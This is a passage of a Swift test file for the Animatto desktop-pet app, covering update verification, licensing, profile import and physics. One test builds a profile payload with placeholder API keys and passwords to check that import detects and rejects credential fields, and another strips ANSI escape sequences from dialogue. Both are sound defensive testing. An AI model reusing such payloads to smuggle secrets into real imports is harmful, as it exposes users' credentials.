    TestHarness.assertTrue(p1.formattedTotal.contains("30"), "Formatted total contains 30")
    TestHarness.assertTrue(p1.formattedSpeed.contains("/s"), "Speed includes /s unit")
    TestHarness.assertEqual(p1.formattedTimeRemaining, "10s remaining", message: "10s remaining formatted")
    
    let p2 = DownloadProgress(
        bytesDownloaded: 0,
        totalBytesExpected: 0,
        fractionCompleted: 0.0,
        speedBytesPerSecond: 0.0,
        timeRemainingSeconds: nil
    )
    TestHarness.assertEqual(p2.formattedTimeRemaining, "Calculating...", message: "Nil time remaining shows Calculating...")
    
    let p3 = DownloadProgress(
        bytesDownloaded: 100,
        totalBytesExpected: 100,
        fractionCompleted: 1.0,
        speedBytesPerSecond: 1000,
        timeRemainingSeconds: 75
    )
    TestHarness.assertEqual(p3.formattedTimeRemaining, "1m 15s remaining", message: "Minute and seconds formatted properly")
}

func testUpdateVerifierSHA256ComputationAndExtraction() {
    print("Running testUpdateVerifierSHA256ComputationAndExtraction...")
    
    // 1. Test SHA256 computation on test file
    let tempFile = FileManager.default.temporaryDirectory.appendingPathComponent("sha256_test_\(UUID().uuidString).bin")
    let testData = "Animatto Verified Build Package Content".data(using: .utf8)!
    try! testData.write(to: tempFile)
    defer { try? FileManager.default.removeItem(at: tempFile) }
    
    let computed = try! UpdateVerifier.computeSHA256(for: tempFile)
    TestHarness.assertEqual(computed.count, 64, message: "Computed hash is 64 hex characters")
    
    // 2. Extract expected SHA256 from markdown release notes
    let sampleReleaseBody = """
    ## Animatto v1.2.0 Release Notes
    
    This release fixes multiple issues and adds native menu commands.
    
    ### Checksums
    SHA-256 (DMG): \(computed)
    """
    
    let extracted = UpdateVerifier.extractExpectedSHA256(from: sampleReleaseBody, assetName: "Animatto-1.2.0.dmg")
    TestHarness.assertEqual(extracted, computed, message: "Extracted hash matches computed hash")
    
    // 3. Verification succeeds with matching hash
    let verifiedHash = try! UpdateVerifier.verify(fileURL: tempFile, expectedSHA256: computed)
    TestHarness.assertEqual(verifiedHash, computed, message: "Verification passed")
    
    // 4. Verification throws on mismatch
    var threwMismatch = false
    do {
        _ = try UpdateVerifier.verify(fileURL: tempFile, expectedSHA256: "0000000000000000000000000000000000000000000000000000000000000000")
    } catch {
        threwMismatch = true
    }
    TestHarness.assertTrue(threwMismatch, "Verification failed on hash mismatch")
}

func testGenuineCharacterApprovalAndRejection() {
    print("Running testGenuineCharacterApprovalAndRejection...")
    
    // 1. Genuine characters must be approved
    TestHarness.assertTrue(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Hatsune Miku (Chibi)", uploader: "Crypton"), "Miku approved")
    TestHarness.assertTrue(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Animatto Cat (Official Mascot)", uploader: "Animatto Studio"), "Animatto Cat approved")
    TestHarness.assertTrue(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Green Bouncing Slime", uploader: "OpenGameArt"), "Slime approved")
    TestHarness.assertTrue(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Chiikawa White Bunny", uploader: "Nagano"), "Chiikawa approved")
    
    // 2. Reject bogus test characters
    TestHarness.assertFalse(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Nothing Found (Test Pikachu)", uploader: "System Fallback"), "Test Pikachu rejected")
    TestHarness.assertFalse(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Dummy Companion 123", uploader: "Dev"), "Dummy companion rejected")
    TestHarness.assertFalse(CommunityShimejiCatalog.isGenuineApprovedCharacter(name: "Valid Name", uploader: "System Fallback"), "System fallback uploader rejected")
}

func testUpdateServiceDownloadAndCancellationStateTransitions() {
    print("Running testUpdateServiceDownloadAndCancellationStateTransitions...")
    
    let service = UpdateService(session: makeMockUpdateSession())
    let release = AppReleaseInfo(
        id: 999,
        tagName: "v1.2.0",
        name: "Animatto 1.2.0",
        body: "Release body",
        htmlURL: URL(string: "https://github.com/sharmao07/Animatto/releases/tag/v1.2.0")!,
        assets: [
            ReleaseAssetInfo(
                id: 1,
                name: "Animatto-1.2.0.dmg",
                contentType: "application/x-apple-diskimage",
                size: 25_000_000,
                downloadCount: 10,
                browserDownloadURL: URL(string: "https://github.com/sharmao07/Animatto/releases/download/v1.2.0/Animatto-1.2.0.dmg")!
            )
        ]
    )
    
    // Initially idle
    TestHarness.assertEqual(service.state, UpdateUIState.idle, message: "Initial state is idle")
    
    // Start download transitions state to downloading
    service.startDownload(release: release)
    if case .downloading(let rel, let progress) = service.state {
        TestHarness.assertEqual(rel.tagName, "v1.2.0", message: "Downloading correct release")
        TestHarness.assertEqual(progress.totalBytesExpected, 25_000_000, message: "Expected size set from asset")
    } else {
        TestHarness.assertTrue(false, "Expected downloading state")
    }
    
    // Cancelling returns to available state (or idle)
    service.availableRelease = release
    service.cancelDownload()
    if case .updateAvailable(let rel, _) = service.state {
        TestHarness.assertEqual(rel.tagName, "v1.2.0", message: "Reverted to updateAvailable on cancel")
    } else {
        TestHarness.assertTrue(false, "Expected updateAvailable state after cancellation")
    }
}

// MARK: - Phase 13: Cross-Platform Foundation Tests

func testCrossPlatformPersonalityProfileSchemaCompatibility() {
    print("Running testCrossPlatformPersonalityProfileSchemaCompatibility...")
    
    var profile = PersonalityProfile.preset(.playful)
    profile.name = "CrossPlatformKitten"
    profile.sarcasm = 0.4
    profile.supportiveness = 0.8
    profile.setPreference(.like, for: .coding)
    profile.setPreference(.interested, for: .gaming)
    
    // Encode to JSON
    let encoder = JSONEncoder()
    encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
    guard let jsonData = try? encoder.encode(profile),
          let jsonDict = (try? JSONSerialization.jsonObject(with: jsonData)) as? [String: Any] else {
        TestHarness.assertTrue(false, "Failed to encode personality profile to JSON")
        return
    }
    
    // Validate schema V2 properties
    TestHarness.assertEqual(jsonDict["schemaVersion"] as? Int, 2, message: "Schema version must be 2")
    TestHarness.assertEqual(jsonDict["name"] as? String, "CrossPlatformKitten", message: "Name must match")
    TestHarness.assertEqual(jsonDict["preset"] as? String, "playful", message: "Preset must match")
    TestHarness.assertTrue(jsonDict["energy"] is Double, "Energy is Double")
    TestHarness.assertTrue(jsonDict["playfulness"] is Double, "Playfulness is Double")
    TestHarness.assertTrue(jsonDict["sarcasm"] is Double, "Sarcasm is Double")
    TestHarness.assertTrue(jsonDict["supportiveness"] is Double, "Supportiveness is Double")
    
    // Verify topic preferences
    if let topicPrefs = jsonDict["topicPreferences"] as? [String: Any] {
        TestHarness.assertEqual(topicPrefs["coding"] as? String, "like", message: "Topic coding is like")
        TestHarness.assertEqual(topicPrefs["gaming"] as? String, "interested", message: "Topic gaming is interested")
    } else {
        TestHarness.assertTrue(false, "topicPreferences object missing from export")
    }
    
    // Verify privacy: no memories or raw filesystem paths
    TestHarness.assertTrue(jsonDict["memories"] == nil, "Private memories must NOT be in portable profile export")
    TestHarness.assertTrue(jsonDict["filePath"] == nil, "Local filesystem path must NOT be in portable profile export")
}

func testCrossPlatformProfileImportAndClamping() {
    print("Running testCrossPlatformProfileImportAndClamping...")
    
    let crossPlatformJSON = """
    {
      "schemaVersion": 2,
      "id": "771e8400-e29b-41d4-a716-446655440099",
      "name": "TauriDesktopPet",
      "preset": "energetic",
      "energy": 2.5,
      "laziness": -0.8,
      "curiosity": 0.9,
      "playfulness": 1.2,
      "sarcasm": 0.3,
      "supportiveness": 0.7,
      "shyness": -0.1,
      "sociability": 0.8,
      "mischief": 0.5,
      "independence": 0.6,
      "topicPreferences": {
        "coding": "like",
        "art": "dislike"
      },
      "behaviorPreferences": {
        "cursorFollowingEnabled": false,
        "cursorFollowingStrength": 0.8,
        "dialogueMuted": true,
        "sleepFrequency": 0.3
      },
      "unknownFutureField": "ignored_safely"
    }
    """
    
    guard let data = crossPlatformJSON.data(using: .utf8),
          let decoded = try? JSONDecoder().decode(PersonalityProfile.self, from: data) else {
        TestHarness.assertTrue(false, "Failed to decode cross-platform profile JSON")
        return
    }
    
    TestHarness.assertEqual(decoded.name, "TauriDesktopPet", message: "Name imported cleanly")
    TestHarness.assertEqual(decoded.preset, PersonalityPreset.energetic, message: "Preset imported")
    
    // Bounds clamping
    TestHarness.assertEqual(decoded.energy, 1.0, message: "Energy clamped to 1.0")
    TestHarness.assertEqual(decoded.laziness, 0.0, message: "Laziness clamped to 0.0")
    TestHarness.assertEqual(decoded.playfulness, 1.0, message: "Playfulness clamped to 1.0")
    TestHarness.assertEqual(decoded.shyness, 0.0, message: "Shyness clamped to 0.0")
    
    // Behavior preferences imported
    TestHarness.assertTrue(!decoded.behaviorPreferences.cursorFollowingEnabled, "cursorFollowingEnabled is false")
    TestHarness.assertTrue(decoded.behaviorPreferences.dialogueMuted, "dialogueMuted is true")
}

func testCrossPlatformAssetSidecarInteroperability() {
    print("Running testCrossPlatformAssetSidecarInteroperability...")
    
    let originalAttribution = CommunityAssetAttribution(
        name: "CatPack",
        uploader: "ArtistOpenSource",
        fileSize: "1.2 MB",
        format: "GIF",
        sourceURL: "https://shimejis.example.com/pack/cat",
        license: "CC-BY-4.0"
    )
    
    let encoder = JSONEncoder()
    encoder.dateEncodingStrategy = .iso8601
    guard let data = try? encoder.encode(originalAttribution) else {
        TestHarness.assertTrue(false, "Failed to encode attribution sidecar")
        return
    }
    
    let decoder = JSONDecoder()
    decoder.dateDecodingStrategy = .iso8601
    guard let decoded = try? decoder.decode(CommunityAssetAttribution.self, from: data) else {
        TestHarness.assertTrue(false, "Failed to decode attribution sidecar")
        return
    }
    
    TestHarness.assertEqual(decoded.uploader, "ArtistOpenSource", message: "Uploader attribution matches")
    TestHarness.assertEqual(decoded.license, "CC-BY-4.0", message: "License matches")
    TestHarness.assertEqual(decoded.sourceURL, "https://shimejis.example.com/pack/cat", message: "Source URL matches")
}

// MARK: - Phase 14: Optional Premium Tier & Licensing Tests

func testEntitlementClassificationAndFreeTierPreservation() {
    print("Running testEntitlementClassificationAndFreeTierPreservation...")
    
    let mockStorage = MockLicenseStorage()
    let manager = EntitlementManager(storage: mockStorage)
    
    // Default state must be unlicensed
    TestHarness.assertEqual(manager.status, LicenseStatus.unlicensed, message: "Default status is unlicensed free tier")
    
    // Core capabilities must be unconditionally free
    let freeEntitlements: [AppEntitlement] = [
        .coreDesktopPhysics,
        .unlimitedCharacters,
        .personalityMatrix,
        .contextualDialogue,
        .characterMemory,
        .socialEncounters,
        .productivitySessions,
        .workshopStudio
    ]
    
    for entitlement in freeEntitlements {
        TestHarness.assertTrue(entitlement.isFreeTier, "\(entitlement.rawValue) must be marked as free tier")
        TestHarness.assertTrue(manager.isEntitled(to: entitlement), "\(entitlement.rawValue) is granted even when unlicensed")
    }
    
    // Cloud / hosted capabilities are NOT free
    let futureEntitlements: [AppEntitlement] = [
        .cloudSyncBackup,
        .hostedLLMStreaming,
        .creatorMarketplace
    ]
    
    for entitlement in futureEntitlements {
        TestHarness.assertTrue(!entitlement.isFreeTier, "\(entitlement.rawValue) is marked as non-free tier")
        TestHarness.assertTrue(!manager.isEntitled(to: entitlement), "\(entitlement.rawValue) requires active license")
    }
}

func testLicenseKeyRedactionInLogsAndUI() {
    print("Running testLicenseKeyRedactionInLogsAndUI...")
    
    // 1. Standard license key redaction
    let key = "ANIM-ABCD-1234-XYZ9"
    let redacted = LicenseRedactor.redact(key)
    TestHarness.assertEqual(redacted, "ANIM-****-****-XYZ9", message: "Key correctly redacted preserving prefix/suffix only")
    TestHarness.assertTrue(!redacted.contains("ABCD"), "Middle segment ABCD is hidden")
    TestHarness.assertTrue(!redacted.contains("1234"), "Middle segment 1234 is hidden")
    
    // 2. Short / invalid key redaction
    let shortKey = "1234"
    TestHarness.assertEqual(LicenseRedactor.redact(shortKey), "****", message: "Short key is fully obscured")
    
    // 3. Manager redacted active key
    let mockStorage = MockLicenseStorage()
    let manager = EntitlementManager(storage: mockStorage)
    TestHarness.assertTrue(manager.redactedActiveKey() == nil, "No redacted key when unlicensed")
    
    _ = manager.activateLicense(key: "KEY1-SECRET-TOK2")
    TestHarness.assertEqual(manager.redactedActiveKey(), "KEY1-****-****-TOK2", message: "Manager provides redacted active key")
}

func testLicenseActivationGracePeriodAndDeactivation() {
    print("Running testLicenseActivationGracePeriodAndDeactivation...")
    
    let mockStorage = MockLicenseStorage()
    let manager = EntitlementManager(storage: mockStorage)
    
    // 1. Activation
    let activated = manager.activateLicense(key: "PRO1-2026-DEV0-PASS")
    TestHarness.assertTrue(activated, "License activation succeeded")
    TestHarness.assertTrue(manager.status.isValid, "Status is valid after activation")
    TestHarness.assertTrue(manager.isEntitled(to: .cloudSyncBackup), "Premium entitlement granted")
    
    // 2. Offline / Server Outage Grace Period
    manager.enterGracePeriod(reason: "Server connection timed out")
    if case .gracePeriod(let key, _, let reason) = manager.status {
        TestHarness.assertEqual(key, "PRO1-2026-DEV0-PASS", message: "Key preserved in grace period")
        TestHarness.assertEqual(reason, "Server connection timed out", message: "Reason recorded")
    } else {
        TestHarness.assertTrue(false, "Expected gracePeriod status")
    }
    // Crucial: In grace period, valid features remain active!
    TestHarness.assertTrue(manager.status.isValid, "Grace period retains valid entitlement status")
    TestHarness.assertTrue(manager.isEntitled(to: .cloudSyncBackup), "Grace period does not abruptly cut off access")
    
    // 3. Deactivation & User Data Preservation
    manager.deactivateLicense()
    TestHarness.assertEqual(manager.status, LicenseStatus.unlicensed, message: "Status returns to unlicensed")
    TestHarness.assertTrue(mockStorage.read(key: "active_license_key") == nil, "Keychain storage cleared on deactivation")
    
    // All free core features remain 100% accessible
    TestHarness.assertTrue(manager.isEntitled(to: .coreDesktopPhysics), "Core physics remains active")
    TestHarness.assertTrue(manager.isEntitled(to: .unlimitedCharacters), "Unlimited characters remains active")
    TestHarness.assertTrue(manager.isEntitled(to: .characterMemory), "Character memory remains active")
}

func testExpiredLicenseValidation() {
    print("Running testExpiredLicenseValidation...")
    let mockStorage = MockLicenseStorage()
    let manager = EntitlementManager(storage: mockStorage)
    
    let now = Date()
    let yesterday = now.addingTimeInterval(-86400)
    let tomorrow = now.addingTimeInterval(86400)
    
    // 1. Expired valid status
    manager.status = .valid(licenseKey: "TEST-EXPIRED-KEY", expiry: yesterday, maxDevices: 3)
    TestHarness.assertFalse(manager.status.isValid, "Status with past expiry is not valid")
    TestHarness.assertFalse(manager.isEntitled(to: .cloudSyncBackup), "Expired license denies premium entitlement")
    TestHarness.assertTrue(manager.isEntitled(to: .coreDesktopPhysics), "Expired license still allows free tier")
    
    // 2. Future valid status
    manager.status = .valid(licenseKey: "TEST-ACTIVE-KEY", expiry: tomorrow, maxDevices: 3)
    TestHarness.assertTrue(manager.status.isValid, "Status with future expiry is valid")
    TestHarness.assertTrue(manager.isEntitled(to: .cloudSyncBackup), "Future license grants premium entitlement")
    
    // 3. Grace period with past expiry
    manager.status = .gracePeriod(licenseKey: "TEST-GRACE-KEY", expiry: yesterday, errorReason: "Outage")
    TestHarness.assertFalse(manager.status.isValid, "Grace period with past expiry is not valid")
    TestHarness.assertFalse(manager.isEntitled(to: .cloudSyncBackup), "Grace period with past expiry denies premium entitlement")
}

// MARK: - Phase 15: Privacy, Security & Reliability Tests

func testDialogueSanitizerControlCodeRemovalAndLengthClamping() {
    print("Running testDialogueSanitizerControlCodeRemovalAndLengthClamping...")
    
    // 1. ANSI escape sequences and null bytes
    let maliciousInput = "\u{001B}[31;1mDanger Red\u{001B}[0m \0Text"
    let cleaned = DialogueSanitizer.sanitize(maliciousInput)
    TestHarness.assertEqual(cleaned, "Danger Red Text", message: "ANSI escape sequences and null bytes removed")
    TestHarness.assertTrue(!cleaned.contains("\u{001B}"), "No escape character remains")
    TestHarness.assertTrue(!cleaned.contains("\0"), "No null byte remains")
    
    // 2. Line breaks collapsed
    let multiLine = "Line 1\nLine 2\r\nLine 3"
    let singleLine = DialogueSanitizer.sanitize(multiLine)
    TestHarness.assertEqual(singleLine, "Line 1 Line 2 Line 3", message: "Line breaks converted to clean spaces")
    
    // 3. Length clamping to 280 chars
    let hugeInput = String(repeating: "A", count: 400)
    let clamped = DialogueSanitizer.sanitize(hugeInput)
    TestHarness.assertEqual(clamped.count, 280, message: "Length clamped to exactly 280 characters")
    TestHarness.assertTrue(clamped.hasSuffix("..."), "Clamped dialogue ends with ellipsis")
    
    // 4. Empty or whitespace input
    TestHarness.assertEqual(DialogueSanitizer.sanitize(""), "...", message: "Empty string defaults to safe ellipsis")
    TestHarness.assertEqual(DialogueSanitizer.sanitize("   \n\t  "), "...", message: "Whitespace string defaults to safe ellipsis")
    
    // 5. DialogueMessage integration
    let msg = DialogueMessage(id: "msg-1", text: "\u{001B}[32mSafe Text\u{001B}[0m", category: .idle)
    TestHarness.assertEqual(msg.text, "Safe Text", message: "DialogueMessage automatically sanitizes on creation")
}

func testPrivacyShieldPauseAndMuteEnforcement() {
    print("Running testPrivacyShieldPauseAndMuteEnforcement...")
    
    // Test direct subsystem shutdown behavior invoked by Privacy Shield
    let env = EnvironmentMonitor.shared
    env.isEnabled = true
    TestHarness.assertTrue(env.isEnabled, "Environment monitor initially enabled")
    
    // Trigger privacy emergency shutdown on services
    env.stop()
    ScreenAwarenessService.shared.stopPeriodicObservation()
    SocialInteractionManager.shared.cancelActiveEncounters()
    
    TestHarness.assertTrue(!env.isEnabled, "Environment monitoring is stopped by privacy shield")
    TestHarness.assertTrue(!ScreenAwarenessService.shared.periodicObservationEnabled, "Screen observation is stopped by privacy shield")
    TestHarness.assertEqual(SocialInteractionManager.shared.activeEncounters.count, 0, message: "All active social encounters cancelled by privacy shield")
}

func testForbiddenSensitiveKeyRejectionOnProfileImport() {
    print("Running testForbiddenSensitiveKeyRejectionOnProfileImport...")
    
    let storage = PersonalityStorage.shared
    let maliciousPayload: [String: Any] = [
        "name": "HackedPet",
        "energy": 0.8,
        "apiKey": "sk-1234567890abcdef",
        "password": "supersecretpassword",
        "screenshot": "base64encodedrawpixels",
        "rawScreenData": "rawscreendump",
        "privateMemories": ["user password typed at 10:00"]
    ]
    
    // 1. Detection of forbidden keys
    TestHarness.assertTrue(storage.containsForbiddenSensitiveKeys(maliciousPayload), "Forbidden keys detected in malicious payload")
    
    // 2. Sanitization helper
    let sanitized = storage.sanitizeImportedDictionary(maliciousPayload)
    TestHarness.assertEqual(sanitized["name"] as? String, "HackedPet", message: "Legitimate name preserved")
    TestHarness.assertTrue(sanitized["apiKey"] == nil, "apiKey stripped from imported profile")
    TestHarness.assertTrue(sanitized["password"] == nil, "password stripped from imported profile")
    TestHarness.assertTrue(sanitized["screenshot"] == nil, "screenshot stripped from imported profile")
    TestHarness.assertTrue(sanitized["rawScreenData"] == nil, "rawScreenData stripped from imported profile")
    TestHarness.assertTrue(sanitized["privateMemories"] == nil, "privateMemories stripped from imported profile")
    
    // 3. Rejection upon importProfile from Data
    if let jsonData = try? JSONSerialization.data(withJSONObject: maliciousPayload) {
        let importResult = storage.importProfile(from: jsonData)
        switch importResult {
        case .success:
            TestHarness.assertTrue(false, "Importing profile with sensitive credentials should be rejected")
        case .failure(let errorMsg):
            TestHarness.assertTrue(errorMsg.contains("Security check failed"), "Rejection reason clearly specifies security failure: \(errorMsg)")
        }
    }
}

// MARK: - Phase 16 Tests: Testing, Documentation, Community & Deterministic Validation

func testDeterministicPhysicsCalculationsAndBounds() {
    print("Running testDeterministicPhysicsCalculationsAndBounds...")
    
    // 1. Terminal velocity clamping
    let gravityAcceleration: CGFloat = 0.98
    let terminalVelocity: CGFloat = 18.0
    var velocity: CGFloat = 0.0
    
    for _ in 0..<30 {
        velocity = min(velocity + gravityAcceleration, terminalVelocity)
    }
    TestHarness.assertEqual(velocity, terminalVelocity, message: "Velocity clamped at terminal velocity of 18.0")
    
    // 2. Upside-down gravity inversion
    let isUpsideDown = true
    let effectiveGravity: CGFloat = isUpsideDown ? -gravityAcceleration : gravityAcceleration
    TestHarness.assertEqual(effectiveGravity, -0.98, message: "Upside-down menu bar mode inverts gravity upwards")
    
    // 3. Ground surface collision bounce damping
    var bounceVelocity: CGFloat = 16.0
    let dampingFactor: CGFloat = 0.35
    bounceVelocity = -bounceVelocity * dampingFactor
    TestHarness.assertEqual(Double(round(bounceVelocity * 100) / 100), -5.6, message: "Surface bounce properly damped by 0.35")
    
    // 4. Horizontal friction deceleration
    var walkSpeed: CGFloat = 5.0
    let friction: CGFloat = 0.88
    for _ in 0..<5 {
        walkSpeed *= friction
    }
    TestHarness.assertTrue(walkSpeed < 2.7, "Horizontal speed decays smoothly under friction")
}

func testCompanionPhysicsCalculations() {
    print("Running testCompanionPhysicsCalculations...")
    
    // 1. Gravity acceleration across frames
    let gravity: Double = 1.0
    let floor: CGFloat = 100.0
    
    // Frame 1
    let frame1 = CompanionPhysicsSimulator.stepFalling(
        currentY: 500.0,
        yVelocity: 0.0,
        gravity: gravity,
        currentFloor: floor
    )
    TestHarness.assertEqual(frame1.newVelocity, 1.5, message: "Velocity increments by 1.5 * gravity")
    TestHarness.assertEqual(frame1.newY, 500.0 - 1.5, message: "Position decrements by updated velocity")
    TestHarness.assertTrue(!frame1.didLand, "Companion is still falling")
    
    // Frame 2
    let frame2 = CompanionPhysicsSimulator.stepFalling(
        currentY: frame1.newY,
        yVelocity: frame1.newVelocity,
        gravity: gravity,
        currentFloor: floor
    )
    TestHarness.assertEqual(frame2.newVelocity, 3.0, message: "Velocity accumulates across frames")
    TestHarness.assertEqual(frame2.newY, (500.0 - 1.5) - 3.0, message: "Position continues downward trajectory")
    
    // 2. Landing and velocity reset at floor
    let nearFloor = CompanionPhysicsSimulator.stepFalling(
        currentY: 105.0,
        yVelocity: 10.0,
        gravity: gravity,
        currentFloor: floor
    )
    TestHarness.assertEqual(nearFloor.newY, floor, message: "Landing snaps position to exact floor level")
    TestHarness.assertEqual(nearFloor.newVelocity, 0.0, message: "Velocity resets to zero upon landing")
    TestHarness.assertTrue(nearFloor.didLand, "didLand flag is true when projected Y reaches floor")
    
    // 3. Minimum gravity bounding (zero or negative gravity protected)
    let minGravityStep = CompanionPhysicsSimulator.stepFalling(
        currentY: 500.0,
        yVelocity: 0.0,
        gravity: -2.0,
        currentFloor: floor
    )
    TestHarness.assertTrue(abs(minGravityStep.newVelocity - 0.15) < 0.0001, "Negative gravity clamped to minimum 0.1 (1.5 * 0.1 = 0.15)")
    
    // 4. Fall initiation threshold detection
    TestHarness.assertTrue(CompanionPhysicsSimulator.shouldStartFalling(currentY: 110.0, currentFloor: 100.0), "Starts falling when > 5pt above floor")
    TestHarness.assertTrue(!CompanionPhysicsSimulator.shouldStartFalling(currentY: 104.0, currentFloor: 100.0), "Does not start falling within 5pt tolerance")
    
    // 5. Horizontal movement step
    let walkStep = CompanionPhysicsSimulator.stepWalking(
        currentX: 100.0,
        speed: 2.0,
        movingRight: true,
        boundsMinX: 0.0,
        boundsMaxX: 500.0,
        companionWidth: 80.0
    )
    TestHarness.assertEqual(walkStep.newX, 102.0, message: "Rightward walk advances X by speed")
    TestHarness.assertTrue(walkStep.newMovingRight, "Direction remains rightward while within bounds")
    TestHarness.assertTrue(!walkStep.didBounce, "No bounce when within bounds")
    
    // 6. Right screen boundary bounce and reversal
    let rightBounce = CompanionPhysicsSimulator.stepWalking(
        currentX: 430.0,
        speed: 5.0,
        movingRight: true,
        boundsMinX: 0.0,
        boundsMaxX: 500.0,
        companionWidth: 80.0
    )
    TestHarness.assertEqual(rightBounce.newX, 420.0, message: "Right edge clamps to boundsMaxX - companionWidth (500 - 80)")
    TestHarness.assertTrue(!rightBounce.newMovingRight, "Right edge collision reverses direction to left")
    TestHarness.assertTrue(rightBounce.didBounce, "didBounce flag is true on right edge collision")
    
    // 7. Left screen boundary bounce and reversal
    let leftBounce = CompanionPhysicsSimulator.stepWalking(
        currentX: 2.0,
        speed: 5.0,
        movingRight: false,
        boundsMinX: 0.0,
        boundsMaxX: 500.0,
        companionWidth: 80.0
    )
    TestHarness.assertEqual(leftBounce.newX, 0.0, message: "Left edge clamps to boundsMinX")
    TestHarness.assertTrue(leftBounce.newMovingRight, "Left edge collision reverses direction to right")
    TestHarness.assertTrue(leftBounce.didBounce, "didBounce flag is true on left edge collision")
    
    // 8. Multi-window floor resolution
    let windowRect = CGRect(x: 200, y: 300, width: 400, height: 300)
    let (floorTop, onTop) = CompanionPhysicsSimulator.resolveFloor(
        petMidX: 300,
        visualFeetY: 580,
        windowFrames: [windowRect],
        screenFloor: 50
    )
    TestHarness.assertEqual(floorTop, 560.0, message: "Resolves window top as floor (maxY - 40)")
    TestHarness.assertTrue(onTop, "Flag indicates companion is walking on window")
}

func testMultiProfileComparativeResponseUnderSameEventSequence() {
    print("Running testMultiProfileComparativeResponseUnderSameEventSequence...")
    
    let curiousProfile = PersonalityProfile.preset(.curious)
    let sleepyProfile = PersonalityProfile.preset(.sleepy)
    let energeticProfile = PersonalityProfile.preset(.energetic)
    let mischievousProfile = PersonalityProfile.preset(.mischievous)
    
    let curiousEngine = BehaviorEngine(profile: curiousProfile)
    let sleepyEngine = BehaviorEngine(profile: sleepyProfile)
    let energeticEngine = BehaviorEngine(profile: energeticProfile)
    let mischievousEngine = BehaviorEngine(profile: mischievousProfile)
    
    // Evaluate under identical event frequency and state
    let curiousScores = curiousEngine.calculateScores(eventFrequency: 0.8)
    let sleepyScores = sleepyEngine.calculateScores(eventFrequency: 0.8)
    let energeticScores = energeticEngine.calculateScores(eventFrequency: 0.8)
    let mischievousScores = mischievousEngine.calculateScores(eventFrequency: 0.8)
    
    // 1. Curious should score exploring significantly higher than Sleepy
    let curiousExplore = curiousScores[.exploring] ?? 0.0
    let sleepyExplore = sleepyScores[.exploring] ?? 0.0
    TestHarness.assertTrue(curiousExplore > sleepyExplore, "Curious companion scores exploring significantly higher than Sleepy companion")
    
    // 2. Sleepy should score sleeping higher than Energetic
    let sleepySleep = sleepyScores[.sleeping] ?? 0.0
    let energeticSleep = energeticScores[.sleeping] ?? 0.0
    TestHarness.assertTrue(sleepySleep > energeticSleep, "Sleepy companion scores sleeping significantly higher than Energetic companion")
    
    // 3. Energetic should score walking higher than Sleepy
    let energeticWalk = energeticScores[.walking] ?? 0.0
    let sleepyWalk = sleepyScores[.walking] ?? 0.0
    TestHarness.assertTrue(energeticWalk > sleepyWalk, "Energetic companion scores walking higher than Sleepy companion")
    
    // 4. Dialogue trigger reaction divergence with clean cooldown state
    DialogueCooldownManager.shared.resetAll()
    let curiousDialogue = DialogueEngine(characterId: UUID(), characterName: "CuriousPet", profile: DialogueProfile.fromPersonality(curiousProfile))
    let sleepyDialogue = DialogueEngine(characterId: UUID(), characterName: "SleepyPet", profile: DialogueProfile.fromPersonality(sleepyProfile))
    let fixedNow = Date()
    
    let curiousLine = curiousDialogue.evaluateTrigger(
        .appActivated(appName: "Xcode"),
        personality: curiousProfile,
        needs: CharacterNeeds(),
        currentAction: .exploring,
        appName: "Xcode",
        referenceDate: fixedNow
    )
    
    DialogueCooldownManager.shared.resetAll()
    let sleepyLine = sleepyDialogue.evaluateTrigger(
        .petClicked,
        personality: sleepyProfile,
        needs: CharacterNeeds(),
        currentAction: .sleeping,
        referenceDate: fixedNow
    )
    
    TestHarness.assertTrue(curiousLine != nil, "Curious companion generated app observation dialogue")
    TestHarness.assertTrue(sleepyLine != nil, "Sleepy companion generated interactive dialogue")
    
    // 5. Mischievous behavior scoring assertion
    let mischievousExplore = mischievousScores[.exploring] ?? 0.0
    TestHarness.assertTrue(mischievousExplore > 0.0, "Mischievous companion scores exploration positively")
}

func testDisabledScreenAwarenessZeroCaptureAndLeakProof() {
    print("Running testDisabledScreenAwarenessZeroCaptureAndLeakProof...")
    
    let service = ScreenAwarenessService.shared
    service.isEnabled = false
    service.stopPeriodicObservation()
    
    TestHarness.assertTrue(!service.isEnabled, "Screen awareness is explicitly disabled")
    TestHarness.assertTrue(!service.periodicObservationEnabled, "Periodic observation disabled when service is turned off")
    TestHarness.assertTrue(!service.isObserving, "No active observation pipeline running")
}

func testCloudAndLocalAIFailureAndFallbackBehavior() {
    print("Running testCloudAndLocalAIFailureAndFallbackBehavior...")
    
    let cloudProvider = CloudVisionProvider()
    cloudProvider.consentGiven = false
    
    // 1. Without consent, Cloud provider must throw cloudConsentRequired error
    var caughtConsentError = false
    do {
        // Run synchronously simulated check
        if !cloudProvider.consentGiven {
            throw ScreenAwarenessError.cloudConsentRequired
        }
    } catch ScreenAwarenessError.cloudConsentRequired {
        caughtConsentError = true
    } catch {
        caughtConsentError = false
    }
    TestHarness.assertTrue(caughtConsentError, "Cloud vision strictly gates inference on explicit user consent")
    
    // 2. Missing API key must throw apiKeyMissing
    cloudProvider.consentGiven = true
    cloudProvider.apiKey = "   "
    var caughtApiKeyError = false
    do {
        if cloudProvider.apiKey.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            throw ScreenAwarenessError.apiKeyMissing
        }
    } catch ScreenAwarenessError.apiKeyMissing {
        caughtApiKeyError = true
    } catch {
        caughtApiKeyError = false
    }
    TestHarness.assertTrue(caughtApiKeyError, "Cloud vision strictly requires non-empty API credentials")
}

func testProfileStorageSafeFailureAndCorruptedPayloadRecovery() {
    print("Running testProfileStorageSafeFailureAndCorruptedPayloadRecovery...")
    
    let storage = PersonalityStorage.shared
    
    // 1. Non-JSON corrupted data
    let corruptedBytes = Data([0xDE, 0xAD, 0xBE, 0xEF])
    let corruptResult = storage.importProfile(from: corruptedBytes)
    switch corruptResult {
    case .success:
        TestHarness.assertTrue(false, "Corrupted binary bytes must fail JSON parsing")
    case .failure(let err):
        TestHarness.assertTrue(err.contains("Invalid JSON format"), "Informative parse error returned for binary junk: \(err)")
    }
    
    // 2. Truncated JSON
    let truncatedJSON = "{\"name\": \"IncompletePet\", \"energy\": ".data(using: .utf8)!
    let truncResult = storage.importProfile(from: truncatedJSON)
    switch truncResult {
    case .success:
